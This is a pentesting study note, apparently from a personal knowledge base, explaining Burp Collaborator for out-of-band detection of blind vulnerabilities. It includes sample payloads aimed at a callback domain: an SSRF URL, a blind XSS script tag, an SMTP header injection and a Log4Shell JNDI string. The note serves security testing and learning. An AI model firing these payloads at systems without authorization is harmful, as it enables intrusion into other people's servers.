---
title: Burp Collaborator
draft: false
tags:
  - burp
  - WebSecurity
  - web-app-testing
  - pentesting
  - bugbounty
  - tools
  - proxy
  - collaborator
NeedsReview: false
---
# 🤝 Burp Collaborator – Deep Dive

## 🧠 What is it?

**Burp Collaborator** is an **external service that listens for DNS, HTTP, and SMTP interactions**, helping you detect attacks like **SSRF**, **Blind XSS**, **SMTP Injection**, and more — where the server reaches _out_ to the attacker.

Burp gives you **custom domain names** (e.g., `abc123.burpcollaborator.net`), and logs all interactions received by them.

---

## 🧪 Why It Matters

Most web vulnerabilities are **reflected** or **stored** — they trigger _in the same request cycle_. But **OAST** vulnerabilities don’t behave that way:

|Vulnerability|What Happens|
|---|---|
|**SSRF**|Server fetches remote resource (e.g., image, URL)|
|**Blind XSS**|Payload stored → triggers JS later (e.g., in admin panel)|
|**SMTP Injection**|Server sends email that causes DNS/SMTP interaction|
|**Log4Shell**|Exploit logs an LDAP/HTTP callback|

You **can’t see these in the response**, so you use Collaborator to **catch the server’s outbound call**.

---

## 🔧 How Collaborator Works

1. Go to **Burp Collaborator Client**
2. Click **"Copy to clipboard"** to get your unique domain (e.g., `h3k4zxyz1w.burpcollaborator.net`)
3. Inject that domain into parameters, headers, forms, etc.
4. Wait for the server to hit your domain
5. Collaborator logs any **DNS**, **HTTP**, or **SMTP** interactions

---

## 🧪 Example Payloads

### 🔸 SSRF

```http
GET /fetch?url=http://abc.burpcollaborator.net
```

### 🔸 Blind XSS

```html
<input type="text" name="fullname" value="<script src=//abc.burpcollaborator.net></script>">
```

### 🔸 SMTP Injection

```plaintext
To: victim@example.com
Subject: Hello

test\nrcpt to: attacker@abc.burpcollaborator.net
```

---

## 📡 Interaction Types Detected

|Protocol|Use Case|
|---|---|
|**DNS**|SSRF, Log4Shell, SSRF over DNS, XXE|
|**HTTP**|Blind XSS, Open Redirect, SSRF|
|**SMTP**|Email injection, SMTP command injection|
|**FTP (sometimes)**|In Java/legacy apps|

---

## 📊 Response in Collaborator Client

|Timestamp|Type|Subdomain|Details|
|---|---|---|---|
|12:32:55|DNS|`abc.burpcollaborator.net`|Server tried resolving it|
|12:32:56|HTTP|`abc.burpcollaborator.net`|Server made GET request|
|12:33:10|SMTP|`abc.burpcollaborator.net`|Email server contacted us|

---

## 🔁 Alternatives to Collaborator (2025)

|Tool|Description|
|---|---|
|**Interact.sh**|Self-hostable OAST server used by Nuclei|
|**CanaryTokens.org**|Token-based alerting system|
|**Custom DNS/HTTP Listener**|Run your own VPS with tcpdump + nginx|

🧠 _Interact.sh is the most feature-rich open-source Burp Collaborator alternative._

---

## 💡 Pro Tips

- Use Collaborator with **Repeater** to trigger manually.
- Combine with **Automated Scan** — Burp Scanner injects collaborator payloads in params automatically.
- Log every interaction and match to test ID (helpful when testing many inputs).
- Some servers restrict outbound HTTP but still resolve DNS — **DNS-only callbacks** can still prove SSRF!

---

## 🧱 Use Case Examples

|Vulnerability|Payload|Expected Interaction|
|---|---|---|
|SSRF|`http://xyz.burpcollaborator.net`|DNS + HTTP|
|Blind XSS|`<script src=//xyz.burpcollaborator.net>`|HTTP|
|Log4Shell|`${jndi:ldap://xyz.burpcollaborator.net}`|DNS + LDAP|
|SMTP Injection|`rcpt to: @xyz.burpcollaborator.net`|SMTP|

---

## 🧠 TL;DR

|Feature|Summary|
|---|---|
|**Purpose**|Detect blind/OAST attacks|
|**Gives You**|A subdomain that logs DNS, HTTP, SMTP|
|**Use Cases**|SSRF, Blind XSS, SMTPi, Log4Shell, XXE|
|**Output**|Viewable in Burp Collaborator Client|
|**Replacements**|`Interact.sh`, `CanaryTokens`, `VPS with tcpdump`|

---
Penguinified by [https://chatgpt.com/g/g-683f4d44a4b881919df0a7714238daae-penguinify](https://chatgpt.com/g/g-683f4d44a4b881919df0a7714238daae-penguinify)
